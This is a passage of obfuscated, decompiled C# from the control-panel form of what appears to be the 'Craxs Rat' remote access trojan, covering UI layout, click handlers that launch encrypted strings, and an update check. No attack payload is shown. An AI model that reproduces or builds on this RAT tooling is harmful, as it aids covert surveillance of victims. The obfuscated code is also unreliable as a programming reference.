            this.DrakeUIAvatar6.Size = new Size(46, 54);
            this.DrakeUIAvatar6.Style = UIStyle.Custom;
            num1 = (int) num2 * 711262020 ^ -358654385;
            continue;
          case 174:
            this.Label1.Text = EXGuarder.\u0036761364C;
            num1 = (int) num2 * 1864514094 ^ -78802546;
            continue;
          case 175:
            this.DrakeUIButton4.RadiusSides = UICornerRadiusSides.LeftBottom | UICornerRadiusSides.RightBottom;
            num1 = (int) num2 * -1203124662 ^ -1942412202;
            continue;
          case 176:
            this.Label7.Location = new Point(194, -67);
            num1 = (int) num2 * 586406318 ^ 499034533;
            continue;
          case 177:
            this.aboutpanel.Controls.Add((Control) this.Label4);
            this.aboutpanel.Controls.Add((Control) this.Label3);
            num1 = (int) num2 * 782432761 ^ -770391877;
            continue;
          case 178:
            this.PictureBox3.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0036E643779);
            num1 = (int) num2 * 1526355087 ^ -1469870338;
            continue;
          case 179:
            this.DrakeUIButton1.RectSides = ToolStripStatusLabelBorderSides.None;
            num1 = (int) num2 * 1697773017 ^ 67994898;
            continue;
          case 180:
            this.subtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.subtext.Size = new Size(738, 32);
            num1 = (int) num2 * -2087554567 ^ -1084017550;
            continue;
          case 181:
            this.PictureBox5.TabIndex = 25;
            this.PictureBox5.TabStop = false;
            num1 = (int) num2 * -594642288 ^ 630957319;
            continue;
          case 182:
            this.PictureBox3.Size = new Size(79, 87);
            this.PictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
            this.PictureBox3.TabIndex = 23;
            this.PictureBox3.TabStop = false;
            this.DrakeUIToolTip1.SetToolTip((Control) this.PictureBox3, EXGuarder.\u00337271D55);
            num1 = (int) num2 * 1721291845 ^ -1872551065;
            continue;
          case 183:
            this.ForeColor = Color.White;
            num1 = (int) num2 * -1638361639 ^ -163966564;
            continue;
          case 184:
            this.DrakeUIAvatar6.Location = new Point(1016, 0);
            num1 = (int) num2 * -1369429063 ^ -140240889;
            continue;
          case 185:
            this.Label7.Margin = new Padding(4, 0, 4, 0);
            this.Label7.Name = EXGuarder.\u00362691D77;
            num1 = (int) num2 * -489938182 ^ 123413351;
            continue;
          case 186:
            this.PictureBox1.TabStop = false;
            num1 = (int) num2 * -1297626973 ^ -790303024;
            continue;
          case 187:
            this.Label4.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num2 * -863687422 ^ -175126315;
            continue;
          case 188:
            this.reportpanel.PerformLayout();
            ((ISupportInitialize) this.PictureBox6).EndInit();
            num1 = (int) num2 * -439063327 ^ 1142851722;
            continue;
          case 189:
            this.DrakeUIToolTip1.SetToolTip((Control) this.PictureBox5, EXGuarder.\u00360452A71);
            this.PictureBox5.Visible = false;
            num1 = (int) num2 * -1543249763 ^ -2071796841;
            continue;
          case 190:
            this.Label9.Font = new Font(EXGuarder.\u003552B5653, 9f, FontStyle.Bold);
            this.Label9.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 453654313 ^ -527038692;
            continue;
          case 191:
            this.reportpanel.Controls.Add((Control) this.reqbtn);
            this.reportpanel.Controls.Add((Control) this.Label6);
            num1 = (int) num2 * 384279679 ^ 1725711338;
            continue;
          case 192:
            this.subtext.TabIndex = 41;
            num1 = (int) num2 * -944280355 ^ -1600038031;
            continue;
          case 193:
            ((ISupportInitialize) this.PictureBox4).BeginInit();
            num1 = (int) num2 * 1589063571 ^ 678556492;
            continue;
          case 194:
            this.PictureBox4.Name = EXGuarder.\u0030B0B320B;
            num1 = (int) num2 * 209289981 ^ -1794542998;
            continue;
          case 195:
            this.reportpanel.Controls.Add((Control) this.Label7);
            this.reportpanel.Controls.Add((Control) this.Label5);
            this.reportpanel.Controls.Add((Control) this.bdytext);
            num1 = (int) num2 * -822179636 ^ 1785142020;
            continue;
          case 196:
            this.aboutpanel.SuspendLayout();
            num1 = (int) num2 * 702357697 ^ -834566791;
            continue;
          case 197:
            this.Label4.Name = EXGuarder.\u00326021609;
            num1 = (int) num2 * 1599083890 ^ -311580757;
            continue;
          default:
            goto label_199;
        }
      }
label_199:
      this.ResumeLayout(false);
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatseraa);
label_1:
        int num1 = -1638148860;
        PictureBox pictureBox1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(--num1 * 1830358473 ^ (1675624757 + 931528256) * 921328905) + 969450504)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              pictureBox1.Click -= eventHandler;
              num1 = (int) num2 * -1554961014 ^ 1971405387;
              continue;
            case 2:
              pictureBox1 = this._PictureBox1;
              int num3 = pictureBox1 == null ? -373044661 : (num3 = -1777674436);
              num1 = num3 ^ (int) num2 * -959448462;
              continue;
            case 3:
              pictureBox1.Click += eventHandler;
              num1 = (int) num2 * -1820373620 ^ 200210811;
              continue;
            case 4:
              this._PictureBox1 = value;
              num1 = 1359119867;
              continue;
            case 5:
              int num4 = pictureBox1 == null ? 2019593703 : (num4 = -669894284);
              num1 = num4 ^ (int) num2 * -712323602;
              continue;
            case 6:
              goto label_3;
            case 7:
              pictureBox1 = this._PictureBox1;
              num1 = (int) num2 * -234457900 ^ -1925633350;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    [field: AccessedThroughProperty("DrakeUIToolTip1")]
    internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox PictureBox4
    {
      get => this._PictureBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsbetsegr);
label_1:
        int num1 = 849912494;
        PictureBox pictureBox4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-~(num1 - (--1037786205 - ~(-328589830 - 211462083) + ~-(989966591 ^ 85965165)) * -1801337191 + -(-787675211 * -743996425) * 420603659 * 1605927571) * -1109626731)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              pictureBox4.Click -= eventHandler;
              num1 = (int) num2 * 1192784569 ^ -1816377771;
              continue;
            case 2:
              goto label_1;
            case 3:
              pictureBox4 = this._PictureBox4;
              int num3 = pictureBox4 == null ? 1147827291 : (num3 = 663270853);
              num1 = num3 ^ (int) num2 * -1006915244;
              continue;
            case 4:
              int num4 = pictureBox4 == null ? -1755539844 : (num4 = -29967638);
              num1 = num4 ^ (int) num2 * 1933953122;
              continue;
            case 5:
              pictureBox4 = this._PictureBox4;
              num1 = (int) num2 * -2124048277 ^ -801196876;
              continue;
            case 6:
              pictureBox4.Click += eventHandler;
              num1 = (int) num2 * -729721459 ^ -1957474231;
              continue;
            case 7:
              this._PictureBox4 = value;
              num1 = -1431859936;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label7
    {
      get => ((CraxsRatMain) this)._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label7 = value;
    }

    internal virtual DrakeUITextBox bdytext
    {
      get => ((CraxsRatMain) this)._bdytext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._bdytext = value;
    }

    internal virtual Label Label6
    {
      get => ((CraxsRatMain) this)._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label6 = value;
    }

    internal virtual DrakeUITextBox subtext
    {
      get => ((CraxsRatMain) this)._subtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._subtext = value;
    }

    internal virtual Label Label5
    {
      get => ((CraxsRatMain) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label5 = value;
    }

    internal virtual DrakeUIButtonIcon reqbtn
    {
      get => ((CraxsRatMain) this)._reqbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._reqbtn = value;
    }

    internal virtual DrakeUIButton DrakeUIButton1
    {
      get => ((CraxsRatMain) this)._DrakeUIButton1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButton1_Click);
label_1:
        int num1 = -1949064261;
        DrakeUIButton drakeUiButton1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(num1 - ~(-937686618 * 981560617 - ~-1649393548 - 52643106 - (-384156352 - 1505376582)))) % 7U)
          {
            case 0:
              drakeUiButton1 = ((CraxsRatMain) this)._DrakeUIButton1;
              int num3 = drakeUiButton1 == null ? -1122700655 : (num3 = -1258373407);
              num1 = num3 ^ (int) num2 * -870327561;
              continue;
            case 1:
              drakeUiButton1.Click -= eventHandler;
              num1 = (int) num2 * -862653206 ^ 1167848197;
              continue;
            case 2:
              drakeUiButton1 = ((CraxsRatMain) this)._DrakeUIButton1;
              int num4 = drakeUiButton1 == null ? 932661002 : (num4 = 1030973330);
              num1 = num4 ^ (int) num2 * 1173253939;
              continue;
            case 3:
              goto label_1;
            case 4:
              ((CraxsRatMain) this)._DrakeUIButton1 = value;
              num1 = -433590779;
              continue;
            case 5:
              drakeUiButton1.Click += eventHandler;
              num1 = (int) num2 * 222078079 ^ -1128520836;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel toppanel
    {
      get => ((CraxsRatMain) this)._toppanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Toppanel_MouseDown);
label_1:
        int num1 = -2045381475;
        Panel toppanel;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 * -400956681 + ~-(-467950369 - 581884674 - -727230218))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              toppanel = ((CraxsRatMain) this)._toppanel;
              int num3 = toppanel == null ? 714583010 : (num3 = 629833388);
              num1 = num3 ^ (int) num2 * 800897210;
              continue;
            case 3:
              ((CraxsRatMain) this)._toppanel = value;
              toppanel = ((CraxsRatMain) this)._toppanel;
              int num4;
              num1 = num4 = toppanel == null ? 1731671698 : (num4 = 1939516083);
              continue;
            case 4:
              toppanel.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -755075360 ^ 28481810;
              continue;
            case 5:
              toppanel.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * -1070389941 ^ 1175509853;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButton DrakeUIButton4
    {
      get => ((CraxsRatMain) this)._DrakeUIButton4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButton4_Click);
label_1:
        int num1 = 1111779878;
        DrakeUIButton drakeUiButton4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~-~(~num1 * 114779129)) % 8U)
          {
            case 0:
              ((CraxsRatMain) this)._DrakeUIButton4 = value;
              num1 = -1582521614;
              continue;
            case 1:
              int num3 = drakeUiButton4 == null ? 1186335262 : (num3 = 1852261811);
              num1 = num3 ^ (int) num2 * 1402768690;
              continue;
            case 2:
              drakeUiButton4 = ((CraxsRatMain) this)._DrakeUIButton4;
              int num4 = drakeUiButton4 == null ? -336688844 : (num4 = 1953149183);
              num1 = num4 ^ (int) num2 * -600059734;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              drakeUiButton4.Click -= eventHandler;
              num1 = (int) num2 * -589170872 ^ 1736499752;
              continue;
            case 6:
              drakeUiButton4 = ((CraxsRatMain) this)._DrakeUIButton4;
              num1 = (int) num2 * -1558892059 ^ -695885719;
              continue;
            case 7:
              drakeUiButton4.Click += eventHandler;
              num1 = (int) num2 * 1040292909 ^ 1624505391;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel aboutpanel
    {
      get => ((CraxsRatMain) this)._aboutpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._aboutpanel = value;
    }

    internal virtual Panel reportpanel
    {
      get => ((CraxsRatMain) this)._reportpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((CraxsRatMain) this)._reportpanel = value;
      }
    }

    public virtual DrakeUIAvatar DrakeUIAvatar6
    {
      get => ((CraxsRatMain) this)._DrakeUIAvatar6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar6_Click);
        DrakeUIAvatar drakeUiAvatar6 = ((CraxsRatMain) this)._DrakeUIAvatar6;
        if (drakeUiAvatar6 == null)
          goto label_8;
label_1:
        int num1 = -2051971045;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(--~num1 * 2020466443 ^ 1242867449 ^ -1844529606)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiAvatar6.Click -= eventHandler;
              num1 = (int) num2 * 2096736665 ^ 1193989058;
              continue;
            case 2:
              int num3 = drakeUiAvatar6 == null ? 1224223177 : (num3 = -1328116597);
              num1 = num3 ^ (int) num2 * -2126867950;
              continue;
            case 3:
              drakeUiAvatar6 = ((CraxsRatMain) this)._DrakeUIAvatar6;
              num1 = (int) num2 * 1251674910 ^ -1167403743;
              continue;
            case 4:
              drakeUiAvatar6.Click += eventHandler;
              num1 = (int) num2 * -1275878757 ^ 1557818857;
              continue;
            case 5:
              goto label_8;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((CraxsRatMain) this)._DrakeUIAvatar6 = value;
        num1 = -633831851;
        goto label_2;
      }
    }

    internal virtual Label Label9
    {
      get => ((CraxsRatMain) this)._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label9 = value;
    }

    internal virtual Label Label1
    {
      get => ((CraxsRatMain) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label1 = value;
    }

    internal virtual Label Label8
    {
      get => ((CraxsRatMain) this)._Label8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label8 = value;
    }

    internal virtual Label Label4
    {
      get => ((CraxsRatMain) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label4 = value;
    }

    internal virtual Label Label3
    {
      get => ((CraxsRatMain) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsRatMain) this)._Label3 = value;
    }

    internal virtual PictureBox PictureBox3
    {
      get => ((CraxsRatMain) this)._PictureBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsergasrg);
label_1:
        int num1 = 1019902776;
        PictureBox pictureBox3;
        MouseEventHandler mouseEventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-~-num1 * 1953465927 ^ -1550077918)) % 9U)
          {
            case 0:
              int num3 = pictureBox3 == null ? -2026226703 : (num3 = 208912835);
              num1 = num3 ^ (int) num2 * -537316964;
              continue;
            case 1:
              goto label_3;
            case 2:
              pictureBox3 = ((CraxsRatMain) this)._PictureBox3;
              num1 = (int) num2 * 1210012599 ^ -2114755551;
              continue;
            case 3:
              pictureBox3.Click -= eventHandler;
              pictureBox3.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * 1571100042 ^ -122666994;
              continue;
            case 4:
              ((CraxsRatMain) this)._PictureBox3 = value;
              num1 = 700437501;
              continue;
            case 5:
              mouseEventHandler = new MouseEventHandler(this.CraxsAbout_MouseDown);
              pictureBox3 = ((CraxsRatMain) this)._PictureBox3;
              num1 = (int) num2 * -299316807 ^ -1167742983;
              continue;
            case 6:
              pictureBox3.Click += eventHandler;
              pictureBox3.MouseDown += mouseEventHandler;
              num1 = (int) num2 * -1208205302 ^ 495939747;
              continue;
            case 7:
              goto label_1;
            case 8:
              int num4 = pictureBox3 == null ? 1622204790 : (num4 = 1342023530);
              num1 = num4 ^ (int) num2 * -1515239828;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual PictureBox PictureBox5
    {
      get => ((CraxsRatMain) this)._PictureBox5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsrt);
label_1:
        int num1 = -1896560677;
        PictureBox pictureBox5;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-num1 * -1099706999 ^ (-558737771 ^ 1423946287 ^ 689212309) + (--657281381 ^ -99155905)) - -2111576859 + -1271585970 * -1570067107 ^ -865154535)) % 9U)
          {
            case 0:
              int num3 = pictureBox5 == null ? 589388343 : (num3 = 2040177336);
              num1 = num3 ^ (int) num2 * -1869190611;
              continue;
            case 1:
              goto label_3;
            case 2:
              pictureBox5.Click += eventHandler;
              num1 = (int) num2 * 1407632812 ^ -1073229296;
              continue;
            case 3:
              pictureBox5 = ((CraxsRatMain) this)._PictureBox5;
              num1 = (int) num2 * 169695895 ^ -796553745;
              continue;
            case 4:
              ((CraxsRatMain) this)._PictureBox5 = value;
              num1 = 380286405;
              continue;
            case 5:
              goto label_1;
            case 6:
              pictureBox5 = ((CraxsRatMain) this)._PictureBox5;
              num1 = (int) num2 * 1987649653 ^ 2064884515;
              continue;
            case 7:
              pictureBox5.Click -= eventHandler;
              num1 = (int) num2 * 260248408 ^ -1524614857;
              continue;
            case 8:
              int num4 = pictureBox5 == null ? 1233413858 : (num4 = 1142243482);
              num1 = num4 ^ (int) num2 * -1815605679;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual PictureBox PictureBox6
    {
      get => ((CraxsRatMain) this)._PictureBox6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwer);
        PictureBox pictureBox6 = ((CraxsRatMain) this)._PictureBox6;
        if (pictureBox6 == null)
          goto label_5;
label_1:
        int num1 = 831580329;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - ~(273231087 ^ -~-751483729 ^ ~-614443091 - 609260177) ^ -(~162024734 - (2116882132 ^ 1207203236) ^ -677138811 ^ -1492566960 ^ --480063329)) - -1400158753 + (-1088813499 ^ 1455639634) * -1323502363 - (-1810136063 - -1240188240) ^ -565579318)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              pictureBox6.Click -= eventHandler;
              num1 = (int) num2 * 2009388496 ^ -426868781;
              continue;
            case 2:
              goto label_5;
            case 3:
              pictureBox6.Click += eventHandler;
              num1 = (int) num2 * -1402380013 ^ -9580577;
              continue;
            case 4:
              goto label_3;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        ((CraxsRatMain) this)._PictureBox6 = value;
        pictureBox6 = ((CraxsRatMain) this)._PictureBox6;
        num1 = pictureBox6 == null ? 665497739 : (num1 = 1980546025);
        goto label_2;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatseraa(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u0035978191C);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1567322159;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~(-num1 - (--1309389700 + 900465821 * (1360773395 * (1536481940 - 932506555))) + -(1164696670 - 1720645275) * -1647090141) ^ 1814742233)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * -1054839700 ^ -1496372510;
              continue;
            case 1:
              int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u00367420E3B);
              num1 = (int) num2 * -1894221368 ^ 923138652;
              continue;
            case 2:
              goto label_4;
            case 3:
              goto label_2;
            default:
              goto label_7;
          }
        }
label_4:
        return;
label_7:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergasrg(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u00328403562);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsbetsegr(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u0035C251902);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -588306793;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(num1 * -1763625321 - ~-6146266) - --1788479250 ^ -485310115)) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * -883158441 ^ -1648193973;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsrt(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u00371242F4A);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1265757866;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~((num1 ^ -((-460135859 ^ -46255681) - --1593777714) + ~~1237010552 * 907872897 - ((-532121459 - 466035205 ^ 642665184 ^ -(-742573241 * -307706209)) + (-715759260 * 1750157131 * 343021315 - 307745095))) - (-(~-1628425424 * 223253329) - -(~155044533 ^ -652029032 - 308031162))) - -460503326 ^ -960742946 - 211509589)) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * -155917186 ^ -1338246122;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwer(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u00312042238);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1327175979;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(-(num1 * -445656313) ^ --1850393350 ^ --2002422834 * -1051260727) ^ 1492200428)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_4;
            case 2:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * 69897078 ^ -1418649268;
              continue;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void Button1_Click(object sender, EventArgs e) => this.Close();

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwrg(object sender, EventArgs e)
    {
      ((CraxsRatMain) this).usermail = RegistryHandler.Get_EMAIL();
    }

    private void CraxsAbout_MouseDown(object sender, MouseEventArgs e)
    {
    }

    private void TabPage1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 585201348;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 * -1728136575 ^ -865598807 - 751992016 - 1033521184 ^ ~656205191 - (1437267001 + 7082983) ^ ~1629020958 ^ (390726219 ^ -2063848242) - (550975315 - -2145319291)) + -1507583922)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -1390295710 ^ 136117153;
            continue;
          case 2:
            goto label_6;
          case 3:
            Codes.ReleaseCapture();
            num1 = (int) num2 * -12770788 ^ -237802102;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUITabControlMenu1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 1370591269;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - (~-160870474 - ((1938674285 ^ -53700594) - (2076125348 - 1871939259) + ~-1151986343 * -2006109159) * -25135541)) - ~~-1090029668)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            Codes.ReleaseCapture();
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * 1499983811 ^ -1434151446;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghju(object sender, EventArgs e)
    {
      try
      {
        string Left1 = Codes.CheckForUpdates2();
label_1:
        int num1 = 91569665;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-(num1 + --(1161755681 * (380345961 - 1849375402) ^ 1420440283 - -1775006242 ^ ~-40049249) ^ ~(1861776868 * 1664339955) * 1515476145 * -682710671)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              if (Left1 != null)
              {
                num1 = (int) num2 * -824859670 ^ -1065139028;
                continue;
              }
              goto label_41;
            default:
              goto label_6;
          }
        }
label_6:
        if (Operators.CompareString(Left1, EXGuarder.\u00371013E5F, false) != 0)
        {
          try
          {
            if (Left1.StartsWith(EXGuarder.\u00337190073))
              goto label_27;
label_8:
            int num3 = -266369487;
label_9:
            UpdatesScreen updatesScreen;
            string Left2;
            string language;
            string Left3;
            string Right;
            string[] strArray;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) ~-(num3 + --(1161755681 * (380345961 - 1849375402) ^ 1420440283 - -1775006242 ^ ~-40049249) ^ ~(1861776868 * 1664339955) * 1515476145 * -682710671)) % 21U)
              {
                case 0:
                  goto label_40;
                case 1:
                  goto label_24;
                case 2:
                  strArray = Left1.Replace(EXGuarder.\u00337190073, EXGuarder.\u0035333341E).Split(':');
                  num3 = (int) num4 * -1430983016 ^ -1670869994;
                  continue;
                case 3:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u003754A343B + Left2);
                  num3 = -559060530;
                  continue;
                case 4:
                  Right = strArray[0];
                  num3 = (int) num4 * 1406229657 ^ 2082365819;
                  continue;
                case 5:
                  goto label_8;
                case 6:
                  Left2 = Codes.WhatNewupdate2();
                  int num5;
                  num3 = num5 = Operators.CompareString(Left2, EXGuarder.\u0034407772A, false) != 0 ? 928216871 : (num5 = 880373789);
                  continue;
                case 7:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u00355560915 + Left2);
                  num3 = (int) num4 * 2109748989 ^ -782676031;
                  continue;
                case 8:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u003410A7135 + Left2);
                  num3 = 603597456;
                  continue;
                case 9:
                  int num6 = Operators.CompareString(language, EXGuarder.\u0032402164C, false) == 0 ? 1296291158 : (num6 = -1075238840);
                  num3 = num6 ^ (int) num4 * -1699956410;
                  continue;
                case 10:
                  int num7 = Operators.CompareString(Left3, Right, false) != 0 ? 1552661530 : (num7 = 1877819591);
                  num3 = num7 ^ (int) num4 * -658095682;
                  continue;
                case 11:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u00355560915 + Left2);
                  num3 = 603597456;
                  continue;
                case 12:
                  int num8 = (int) updatesScreen.ShowDialog();
                  num3 = 390576627;
                  continue;
                case 13:
                  int num9 = Operators.CompareString(language, EXGuarder.\u0037724502B, false) == 0 ? 1488032912 : (num9 = 1494452674);
                  num3 = num9 ^ (int) num4 * 1550262684;
                  continue;
                case 14:
                  updatesScreen = new UpdatesScreen();
                  language = RegistryHandler.Get_Language();
                  int num10;
                  num3 = num10 = Operators.CompareString(language, EXGuarder.\u0037240702A, false) == 0 ? 289900425 : (num10 = -1014623848);
                  continue;
                case 15:
                  Codes.MyMsgBox(EXGuarder.\u0034B0D1967, EXGuarder.\u0032A115600, false, Craxs_Rat.My.Resources.Resources.sucess48px);
                  num3 = (int) num4 * 1626862381 ^ 1935293577;
                  continue;
                case 16:
                  goto label_27;
                case 17:
                  goto label_34;
                case 18:
                  num3 = (int) num4 * 506052380 ^ -251836632;
                  continue;
                case 19:
                  num3 = (int) num4 * 1546983137 ^ -746594431;
                  continue;
                case 20:
                  Left2 = EXGuarder.\u0032F263E07;
                  num3 = (int) num4 * 66115715 ^ 1368247654;
                  continue;
                default:
                  goto label_30;
              }
            }
label_40:
            return;
label_34:
            return;
label_30:
            return;
label_24:
            Codes.MyMsgBox(EXGuarder.\u0032748340E, EXGuarder.\u0036013391F, false, Craxs_Rat.My.Resources.Resources.error48px);
            return;
label_27:
            Left3 = Codes.Encrypt(Codes.hashmd5(Application.ExecutablePath), EXGuarder.\u0034C03050D);
            num3 = 350762354;
            goto label_9;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
label_32:
            int num11 = 67152521;
            while (true)
            {
              uint num12;
              switch ((num12 = (uint) ~-(num11 + --(1161755681 * (380345961 - 1849375402) ^ 1420440283 - -1775006242 ^ ~-40049249) ^ ~(1861776868 * 1664339955) * 1515476145 * -682710671)) % 3U)
              {
                case 0:
                  goto label_32;
                case 2:
                  Codes.MyMsgBox(EXGuarder.\u0032748340E, EXGuarder.\u0036013391F, false, Craxs_Rat.My.Resources.Resources.error48px);
                  num11 = (int) num12 * 1543500507 ^ 267573876;
                  continue;
                default:
                  goto label_36;
              }
            }
label_36:
            ProjectData.ClearProjectError();
            return;
          }
        }
        else
        {
          Codes.MyMsgBox(EXGuarder.\u0032748340E, EXGuarder.\u0036013391F, false, Craxs_Rat.My.Resources.Resources.error48px);
          return;
        }
label_41:
